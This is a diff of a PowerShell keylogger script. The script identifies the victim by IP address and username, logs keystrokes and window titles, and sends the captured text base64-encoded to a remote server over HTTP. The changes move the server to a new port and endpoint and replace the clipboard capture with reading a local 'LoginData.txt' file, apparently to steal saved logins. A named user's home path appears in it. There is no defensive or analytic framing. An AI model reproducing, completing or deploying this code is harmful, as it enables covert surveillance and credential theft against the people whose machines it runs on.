@@ -1,5 +1,5 @@
-cd 'c:\Users\Mehmet Dere\Desktop\Yeniklasör\'
-$server = 'http://192.168.1.41:7070'
+
+$server = 'http://192.168.1.41:1111'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -164,7 +164,7 @@ while ($true) {
 					$Outout = "`n[$WindowTitle - "\\?\"+$TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
-                    $outfile += get-clipboard
+                    $outfile += get-item "C:\Users\Mehmet Dere\Desktop\Yeniklasör\LoginData.txt"
 				$Outout += $mychar.ToString()
 				$buff += $outfile
 			}
@@ -175,7 +175,7 @@ while ($true) {
 		$timer = 0
 		$buff = $buff.Trim()
 		if($buff.Length -gt 10) {
-			if((New-Object Net.WebClient).DownloadString($server+'/set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
+			if((New-Object Net.WebClient).DownloadString($server+'/set_lib/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
 				Exit
 			}
 
